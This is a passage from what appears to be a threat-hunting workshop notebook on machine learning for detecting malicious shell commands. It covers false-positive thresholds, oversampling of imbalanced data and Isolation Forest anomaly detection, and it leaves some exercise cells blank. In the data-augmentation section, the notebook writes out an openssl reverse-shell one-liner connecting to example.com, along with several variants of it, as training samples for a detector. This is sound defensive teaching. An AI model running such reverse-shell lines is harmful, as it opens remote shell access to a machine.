    "    if key == \"HashingVectorizer\":\n",
    "        plot_confusion_matrix(preds, yl, threshold=0.5, counts=True, ax=ax[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Varying False Positive rate is possible with defining a probability threshold, based on which we consider sample to be malicious, since output of model is not a binary, it is a probability in range $p \\in [0,1]$:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.0002 0.0041 0.9805 0.0041 0.0001 "
     ]
    }
   ],
   "source": [
    "_ = [print(f\"{x:.4f}\", end=\" \") for x in preds[380:385]]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 0 1 0 0 "
     ]
    }
   ],
   "source": [
    "_ = [print(f\"{x}\", end=\" \") for x in yl[380:385]]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's observe what threshold values and, consequently, detection rates are representative for a specific False Positive rate:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "---------------------------------------------------------------------------------------------------------\n",
      "             One-Hot : False Positive rate: 0.005% | Detection rate: 69.92% | Threshold: 0.6507 \n",
      "              TF-IDF : False Positive rate: 0.005% | Detection rate: 73.17% | Threshold: 0.5926 \n",
      "   HashingVectorizer : False Positive rate: 0.005% | Detection rate: 81.30% | Threshold: 0.5318 \n",
      "---------------------------------------------------------------------------------------------------------\n",
      "             One-Hot : False Positive rate: 0.010% | Detection rate: 73.17% | Threshold: 0.5031 \n",
      "              TF-IDF : False Positive rate: 0.010% | Detection rate: 78.05% | Threshold: 0.5442 \n",
      "   HashingVectorizer : False Positive rate: 0.010% | Detection rate: 86.99% | Threshold: 0.3172 \n",
      "---------------------------------------------------------------------------------------------------------\n",
      "             One-Hot : False Positive rate: 0.050% | Detection rate: 78.05% | Threshold: 0.2195 \n",
      "              TF-IDF : False Positive rate: 0.050% | Detection rate: 84.55% | Threshold: 0.2995 \n",
      "   HashingVectorizer : False Positive rate: 0.050% | Detection rate: 89.43% | Threshold: 0.2313 \n",
      "---------------------------------------------------------------------------------------------------------\n",
      "             One-Hot : False Positive rate: 0.100% | Detection rate: 79.67% | Threshold: 0.1561 \n",
      "              TF-IDF : False Positive rate: 0.100% | Detection rate: 87.80% | Threshold: 0.2105 \n",
      "   HashingVectorizer : False Positive rate: 0.100% | Detection rate: 91.06% | Threshold: 0.1415 \n",
      "---------------------------------------------------------------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "def get_threshold_from_rate(thresholds, rate_array, rate):\n",
    "    index = np.where(rate_array >= rate)[0][0]\n",
    "    return thresholds[index]\n",
    "\n",
    "def get_value_from_threshold(values, thresholds, threshold):\n",
    "    try:\n",
    "        thr_index = np.where(thresholds <= threshold)[0][0]\n",
    "    except IndexError:\n",
    "        thr_index = 0\n",
    "    return values[thr_index]\n",
    "\n",
    "print(\"---\" * 35)\n",
    "for fpr_rate in [0.00005, 0.0001, 0.0005, 0.001]:\n",
    "    for encoding in [\"One-Hot\", \"TF-IDF\", \"HashingVectorizer\"]:\n",
    "        threshold = get_threshold_from_rate(metrics[\"threshold_roc\"][encoding], metrics[\"fpr\"][encoding], fpr_rate)\n",
    "        tpr_rate = get_value_from_threshold(metrics[\"tpr\"][encoding], metrics[\"threshold_roc\"][encoding], threshold)\n",
    "        print(f\"{encoding:>20} : False Positive rate: {fpr_rate*100:>5.3f}% | Detection rate: {tpr_rate*100:>5.2f}% | Threshold: {threshold:>5.4f} \")\n",
    "    print(\"---\" * 35)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Heavy Imbalance: representative situation for security problems\n",
    "\n",
    "It is common to have a heavily imbalanced dataset when ML methods are applied to security problem. It is much harder to acquire well generalized distribution of malicious activity in common enterprise infrastucture. On the contrary, benign activity is abundant, and is easy to acquire.\n",
    "\n",
    "In such cases predicting $y==0$, i.e. \"always benign\" allows to achieve high accuracy:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Predicting 'always benign' yields 99.03% accuracy.\n"
     ]
    }
   ],
   "source": [
    "always_benign = np.zeros(len(y))\n",
    "print(f\"Predicting 'always benign' yields {accuracy_score(y, always_benign)*100:.2f}% accuracy.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x432 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from matplotlib.ticker import ScalarFormatter\n",
    "def plot_classes(y, log=False):\n",
    "    _, ax = plt.subplots(figsize=(6,6))\n",
    "    ax.bar(x=[\"Benign\",\"Malicious\"],\n",
    "            height=(np.sum(y==0), np.sum(y==1)), \n",
    "            color=[\"steelblue\", \"orange\"],\n",
    "            width=0.6)\n",
    "\n",
    "    ax.set_xticks([\"Benign\",\"Malicious\"])\n",
    "    ax.set_ylabel(\"Count\")\n",
    "    ax.set_title(\"Counts of benign and malicious samples in dataset\", fontsize=16)\n",
    "    if log:\n",
    "        ax.set_yscale(\"log\")\n",
    "\n",
    "plot_classes(y, log=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is clearly seen that number of malicious samples is too small. \n",
    "\n",
    "Statistical intution behind that might be as follows - ML algorithms learn data distribution behind a specific class, and in our case there is too little data for algorithm to infer general patterns behind malicious data. It is like sampling 100 persons out of specific country and describe a citizens based just on this sample of 100 people - obvsiously it will be biased towards characteristics encountered in this group.\n",
    "\n",
    "There are several approaches to combat imbalanced data, for instance:\n",
    "\n",
    "- data augmentation - generating new samples based on domain knowledge\n",
    "- data oversampling - balancing class counts by including multiple occurences of minority class\n",
    "\n",
    "Example of data augmentation is as follows. Consider enrypted reverse shell that utilizes `openssl` we discussed earlier:\n",
    "\n",
    "```\n",
    "mkfifo /tmp/s ; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect example.com:4242 > ; rm /tmp/s\n",
    "```\n",
    "\n",
    "We can artificially generate another functional examples of this technique by modifying ambiguous parts and including them into dataset, e.g.:\n",
    "\n",
    "```\n",
    "mkfifo /tmp/FOOBAR ; /bin/sh -i < /tmp/FOOBAR 2>&1 | openssl s_client -quiet -connect example.com:4242 > /tmp/FOOBAR ; rm /tmp/FOOBAR\n",
    "mkfifo /home/user/TEST ; /bin/sh -i < /home/user/TEST 2>&1 | openssl s_client -quiet -connect example.com:4242 > /home/user/TEST\n",
    "mkfifo /tmp/s ; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect example.com:443 > ; rm /tmp/s\n",
    "mkfifo /tmp/s ; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect example.com:443 > ; rm /tmp/s\n",
    "mkfifo /tmp/s ; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect example.com:53 > ; rm /tmp/s\n",
    "...\n",
    "```\n",
    "\n",
    "This is a decent approach that allows to acquire model much more ready for production deployment.\n",
    "\n",
    "For the purpose of this exercise, however, we will implement only oversampling - greedy increase of minority class to even class occurences:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Predicting 'always benign' yields 50.00% accuracy.\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x432 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from imblearn.over_sampling import RandomOverSampler\n",
    "\n",
    "ros = RandomOverSampler(\n",
    "                sampling_strategy=\"minority\", \n",
    "                random_state=RANDOM_SEED)\n",
    "\n",
    "X[\"TF-IDF resampled\"], yr = ros.fit_resample(X[\"TF-IDF\"], y)\n",
    "X[\"HashingVectorizer resampled\"], yr = ros.fit_resample(X[\"HashingVectorizer\"], y)\n",
    "\n",
    "plot_classes(yr)\n",
    "\n",
    "always_benign = np.zeros(len(yr))\n",
    "print(f\"Predicting 'always benign' yields {accuracy_score(yr, always_benign)*100:.2f}% accuracy.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "\n",
    "### `Task 3`: observe how Resampling affected the detection rate of our classifier - train a new model for each set of inputs defined as `X[key]`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x432 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from collections import defaultdict\n",
    "metrics = defaultdict(dict)\n",
    "\n",
    "_, ax = plt.subplots(figsize=(10,6))\n",
    "for key in [\"HashingVectorizer\", \"TF-IDF\", \"HashingVectorizer resampled\", \"TF-IDF resampled\"]:\n",
    "    yl = yr if \"resampled\" in key else y\n",
    "\n",
    "    # YOUR CODE HERE\n",
    "    model_predictions = None\n",
    "\n",
    "    metrics = plot_roc_metrics(model_predictions, yl, metrics, name = key, ax=ax)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Supervised learning - recap:\n",
    "\n",
    "- Do not got for Deep Learning models unless you know **why** you need that. Otherwise, choose other more bulletproof ML algorithms like decision tree based models.\n",
    "- Evaluation of ML solution for security needs is not a single question, and for production deployments **detection rate with fixed False Positive threshold** is the best representation.\n",
    "- Security problems are often represented by imbalanced data, therefore additional techniques like data oversampling or better **augmentation** are needed.\n",
    "\n",
    "# Unsupervised learning: Anomaly Detection\n",
    "\n",
    "There are wide range of anomaly detection approaches known, each with their pros and cons. Here is a brief visualisation on several algorithms implemented in sklearn, respectively [EllipticEnvelope](https://scikit-learn.org/0.20/modules/generated/sklearn.covariance.EllipticEnvelope.html#sklearn.covariance.EllipticEnvelope), [OneClassSVM](https://scikit-learn.org/0.20/modules/generated/sklearn.svm.OneClassSVM.html#sklearn.svm.OneClassSVM), [IsolationForest](https://scikit-learn.org/0.20/modules/generated/sklearn.ensemble.IsolationForest.html#sklearn.ensemble.IsolationForest) and [LocalOutlierFactor](https://scikit-learn.org/0.20/modules/generated/sklearn.neighbors.LocalOutlierFactor.html#sklearn.neighbors.LocalOutlierFactor) [[source]](https://scikit-learn.org/0.20/auto_examples/plot_anomaly_comparison.html):\n",
    "\n",
    "<img src=\"../img/sklearn_ad_comparison.png\" width=600>\n",
    "\n",
    "We will not dig in describing Isolation Forest details due to time constraints, but intuition behind single run of outlier detection on 2-dimensional data is visualised below, with good explanation behind this [source](https://quantdare.com/isolation-forest-algorithm/):\n",
    "\n",
    "<img src=\"../img/isolation_forest_outlier_isolation.gif\" width=600>\n",
    "\n",
    "Let's apply an enseble (multiple estimators trained in parallel for a single decision heuristic) of Isolation Forest on our data:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.ensemble import IsolationForest\n",
    "from sklearn.utils import shuffle\n",
    "\n",
    "clf = IsolationForest(n_estimators=100, \n",
    "                        contamination=float(.05),\n",
    "                        max_samples='auto',\n",
    "                        max_features=1.0, \n",
    "                        bootstrap=False, \n",
    "                        n_jobs=-1, \n",
    "                        random_state=RANDOM_SEED, \n",
    "                        verbose=0)\n",
    "\n",
    "clf.fit(shuffle(X[\"TF-IDF\"], random_state=RANDOM_SEED))\n",
    "\n",
    "pred = clf.predict(X[\"TF-IDF\"])\n",
    "outlier_index = np.where(pred==-1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here are anomalies what `IsolationForest` identified:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total outliers found:  637\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[\"xargs -i rm '{}'\",\n",
       " 'find $LOGDIR -type d -mtime +0 -exec compress -r {} \\\\;',\n",
       " 'file ~/myfile',\n",
       " \"IFS= read -d $'\\\\0' -r file\",\n",
       " 'unset array[`shuf -i 0-4 -n1`];',\n",
       " 'unset array[`shuf -i 0-3 -n1`]',\n",
       " 'nohup php -r \\'while (true) { echo \"a\";}\\' &',\n",
       " 'tail -n 100 file1 | bar | wc -l',\n",
       " 'tail -n 100 file1 | pv | wc -l',\n",
       " 'chown -v root \"$file\"']"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_outliers = [X[\"raw\"][i] for i in outlier_index[0]]\n",
    "print(\"Total outliers found: \", len(X_outliers))\n",
    "X_outliers[-120:-110]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Before jumping to conlcusions about results of this anomaly detection round, let's try to visualize anomalies. We have one problem - our data has 500 dimensions...\n",
    "\n",
    "### Dimensionality reduction\n",
    "\n",
    "We can apply dimensionality reduction techniques to visualise anomalies.\n",
    "\n",
    "For example, here is visual intuition on how to apply dimensionality reduction from 2 dimensions to 1 dimension [[Source]](https://ethen8181.github.io/machine-learning/):\n",
    "\n",
    "<img src=\"../img/pca2.png\" width=700>\n",
    "\n",
    "We need a specific logic to define line in 2 dimensions to maximize variance and minimize residuals (i.e. error). In the case above it is a Principal Component Analysis (PCA). We, however, will use [TruncatedSVD](https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.TruncatedSVD.html), since we cannot apply PCA directly on sparse matrices, and we do not have 2D $\\rightarrow$ 1D, but 500D $\\rightarrow$ 3D, so our reduction is mostly cosmetic:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x720 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from sklearn.decomposition import TruncatedSVD\n",
    "from sklearn.preprocessing import StandardScaler\n",
    "\n",
    "def plot_3d_anomalies(X, outlier_index):\n",
    "    #normalize the metrics\n",
    "    scaler = StandardScaler(with_mean=False)\n",
    "    X_scaled = scaler.fit_transform(X)\n",
    "\n",
    "    # reduce the dimensionality\n",
    "    dim_reduction = TruncatedSVD(n_components=3, random_state=RANDOM_SEED)\n",
    "    X_reduced = dim_reduction.fit_transform(X_scaled)\n",
    "\n",
    "    fig = plt.figure(figsize=(10,10))\n",
    "    ax = fig.add_subplot(111, projection='3d')\n",
    "\n",
    "    # Plot the compressed data points\n",
    "    ax.scatter(X_reduced[:, 0], X_reduced[:, 1], zs=X_reduced[:, 2], \n",
    "                s=4, lw=1, label=\"inliers\", c=\"green\")\n",
    "    # Plot x's for the ground truth outliers\n",
    "    ax.scatter(X_reduced[outlier_index,0], X_reduced[outlier_index,1], X_reduced[outlier_index,2],\n",
    "                s=60, lw=2, marker=\"x\", c=\"red\", label=\"outliers\")\n",
    "    ax.legend()\n",
    "    return X_reduced\n",
    "\n",
    "reduced = plot_3d_anomalies(X[\"TF-IDF\"], outlier_index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(12730, 3)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([ 0.96866158,  1.97601916, -1.43992922])"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(reduced.shape)\n",
    "reduced[0,:]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(12730, 500)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.        , 0.17798415, 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.51508213, 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.        , 0.        , 0.        , 0.        ,\n",
       "        0.        , 0.63147246, 0.        , 0.        , 0.        ]])"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(X[\"TF-IDF\"].shape)\n",
    "X[\"TF-IDF\"][0,:50].toarray()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Plot allows to see that too many samples in dataset appear to be an \"anomaly\" in some sense. Therefore, it is wrong to seek for anomalies in your environment - too many aspects of everyday operation are anomalous based on some characteristics of data.\n",
    "\n",
    "### **Bad** questions for unsupervised machine learning:\n",
    "\n",
    "- anomalous commandlines (so I can spot APTs) - your telemetry have hunderds anomalous commandlines a week\n",
    "- anomalous network traffic - happens dozens of time every day in production environment\n",
    "- anomalous process binary - hello `jre1.8.0_311\\bin\\java.exe`, `~/.tmp/c65631efd85f890604dc3cd8dbd717/vs_setup_bootstrapper.exe`, etc.\n",
    "\n",
    "\n",
    "### **Good** questions for unsupervised machine learning focus on specific TTPs:\n",
    "\n",
    "Linux world:\n",
    "- anomalous python/perl/ruby process (execution via scripting interpreter, [T1059.006](https://attack.mitre.org/techniques/T1059/006/))\n",
    "- anomalous systemd command (persistence via systemd process, [T1543.002](https://attack.mitre.org/techniques/T1543/002/))\n",
    "- anomalous ssh login source ([T1021.004](https://attack.mitre.org/techniques/T1021/004/))\n",
    "\n",
    "Windows world:\n",
    "- anomalous user logged in on DC/MSSQL servers ([T1021.002](https://attack.mitre.org/techniques/T1021/002/), use EventID 4624)\n",
    "- anomalous process that loads NTDLL.DLL ([T1129](https://attack.mitre.org/techniques/T1129/), use Sysmon ID 7)\n",
    "- anomalous RDP client and server combination ([T1021.001](https://attack.mitre.org/techniques/T1021/001/), use Sysmon ID 3)\n",
    "\n",
    "\n",
    "### `Task 4`: perfoms an anomaly detection on python commandlines only (defined as `X_python_raw`) and observe anomalies in 3D plot:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "X_python_benign = 100*[x for x,yy in zip(X[\"raw\"],y) if \"python\" in x.lower() and yy == 0]\n",
    "python_reverse_shell = [(x,yy) for x,yy in zip(X[\"raw\"],y) if \"python\" in x.lower() and yy == 1][4][0]\n",
    "X_python_raw = shuffle(X_python_benign + [python_reverse_shell], random_state=RANDOM_SEED)\n",
    "\n",
    "# YOUR CODE HERE:\n",
    "\n",
    "X_python_encoded = None\n",
    "model = None\n",
    "outlier_index_python = None\n",
    "\n",
    "plot_3d_anomalies(X_python_encoded, outlier_index_python)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "set([X_python_raw[i] for i in outlier_index_python[0]])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After completion of this task you should see that reverse shell is nicely appears as anomalous within the narrowed dataset we provided.\n",
    "\n",
    "# Summary and final thoughts\n",
    "\n",
    "- Machine Learning (ML) is **not** a silver bullet - it will not substitute analysts, humans will not lose their jobs. **Machine Learning is a tool**, and those who master this tool will have an edge in Threat Hunting.\n",
    "- For many cases you do not need ML at all. Consider:\n",
    "  - triggers against specific **thresholds** to match **countable** events, e.g. number of connections / logins;\n",
    "  - aggregations like `rare_terms` to filter unusual **categories**, e.g. usernames, IP addresses, etc.\n",
    "  - manually **post-processing** noisy alerts with extra logic, like grouping them by hostname or usernames;  \n",
    "- Bringing ML in your daily operations require security domain knowledge:\n",
    "  - Distinct data sources like Unix `auditd` telemetry benefit hugely from a dedicated tools, like Shell Language Processing tokenizer.\n",
    "  - ML will not magically detect malicious command because it is anomalous. Daily operations are flooded with anomalous cases. Asking correct question to ML powered with your knowledge on TTPs is the key.  \n",
    "- Remember to correctly evaluate models for security problems:\n",
    "  - Classical metrics like accuracy or F1 score are often too shallow.\n",
    "  - Metrics like **detection rate with fixed False Positive threshold** allows to understand ML model utility in real world, given production usage in SOCs / CERTs / vendor solutions.\n",
    "- Imbalanced data is a common problem in security domain. Be ready to manualy **augment data** to allow models generalize better.\n"
   ]
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "31f2aee4e71d21fbe5cf8b01ff0e069b9275f58929596ceb00d14d90e3e16cd6"
  },
  "kernelspec": {
   "display_name": "Python 3.6.8 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.9"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
